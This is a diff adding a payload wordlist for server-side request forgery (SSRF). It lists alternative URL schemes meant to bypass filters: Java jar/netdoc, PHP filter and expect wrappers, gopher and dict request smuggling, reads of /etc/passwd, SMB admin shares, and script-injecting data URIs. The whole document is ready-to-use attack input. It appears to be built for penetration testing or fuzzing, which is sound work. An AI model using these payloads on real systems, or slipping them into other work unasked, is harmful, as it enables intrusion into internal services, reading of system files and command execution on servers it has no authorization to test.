@@ -1,0 +1,152 @@
+# Scheme Confusion / Alternative Protocol Payloads
+# Less common protocols that might bypass filters
+
+# Java-specific
+jar:http://127.0.0.1!/
+jar:file:///etc/passwd!/
+netdoc:///etc/passwd
+netdoc://127.0.0.1/admin
+
+# PHP wrappers
+php://filter/resource=http://127.0.0.1
+php://input
+php://filter/convert.base64-encode/resource=http://internal
+expect://id
+expect://whoami
+
+# Data URIs
+data://text/plain;base64,SSBsb3ZlIFNTUkY=
+data:text/html,<script>alert('SSRF')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRicpPC9zY3JpcHQ+
+
+# TFTP (Trivial File Transfer Protocol)
+tftp://127.0.0.1/file
+tftp://internal-server/config
+
+# LDAP variations
+ldap://127.0.0.1:389
+ldap://127.0.0.1:389/dc=example,dc=com
+ldapi:///
+ldap://localhost:389/%0astats%0aquit
+
+# SMB/CIFS
+smb://127.0.0.1/share
+\\127.0.0.1\share
+\\localhost\c$
+
+# NFS (Network File System)
+nfs://127.0.0.1/export
+
+# Telnet
+telnet://127.0.0.1:23
+telnet://admin:password@127.0.0.1
+
+# IRC
+irc://127.0.0.1:6667
+ircs://127.0.0.1:6697
+
+# RTSP (Real Time Streaming Protocol)
+rtsp://127.0.0.1:554
+rtsps://127.0.0.1:322
+
+# SIP (Session Initiation Protocol)
+sip:user@127.0.0.1
+sips:user@127.0.0.1:5061
+
+# Git protocols
+git://127.0.0.1/repo.git
+git+ssh://127.0.0.1/repo.git
+
+# SVN
+svn://127.0.0.1/repo
+svn+ssh://127.0.0.1/repo
+
+# Zlib
+compress.zlib://http://127.0.0.1
+compress.bzip2://http://127.0.0.1
+
+# Phar (PHP Archive)
+phar://archive.phar/file.php
+phar:///path/to/archive.phar/file
+
+# Glob
+glob://var/www/html/*.php
+glob:///etc/passwd
+
+# OGG
+ogg://127.0.0.1/stream
+
+# SSH variations
+ssh://127.0.0.1
+ssh://user@127.0.0.1:22
+
+# RDP
+rdp://127.0.0.1:3389
+
+# VNC
+vnc://127.0.0.1:5900
+
+# XMPP (Jabber)
+xmpp://127.0.0.1:5222
+
+# Finger protocol
+finger://127.0.0.1
+finger://user@127.0.0.1
+
+# Rsync
+rsync://127.0.0.1/module
+
+# NNTP (Network News Transfer Protocol)
+nntp://127.0.0.1:119
+news://127.0.0.1
+
+# Whois
+whois://127.0.0.1
+
+# SNMP
+snmp://127.0.0.1:161
+
+# RTMP (Real-Time Messaging Protocol)
+rtmp://127.0.0.1/live
+rtmps://127.0.0.1/live
+
+# WebDAV
+dav://127.0.0.1
+davs://127.0.0.1
+
+# CalDAV/CardDAV
+caldav://127.0.0.1
+carddav://127.0.0.1
+
+# IPFS
+ipfs://QmHash
+ipns://domain
+
+# Magnet links
+magnet:?xt=urn:btih:hash
+
+# Ed2k
+ed2k://|file|name|size|hash|
+
+# Custom/Rare protocols
+steam://connect/127.0.0.1
+teamspeak://127.0.0.1
+mumble://127.0.0.1
+discord://127.0.0.1
+
+# Gopher with commands
+gopher://127.0.0.1:70/_GET%20/admin%20HTTP/1.1%0AHost:%20127.0.0.1
+gopher://127.0.0.1:70/_POST%20/api%20HTTP/1.1
+
+# Dict with commands
+dict://127.0.0.1:2628/STAT
+dict://127.0.0.1:2628/SHOW%20DB
+
+# SSRF via protocol handlers
+view-source:http://127.0.0.1
+about:blank
+javascript:alert(1)
+
+# Wrapper combinations
+zip://archive.zip#file.txt
+rar://archive.rar#file.txt
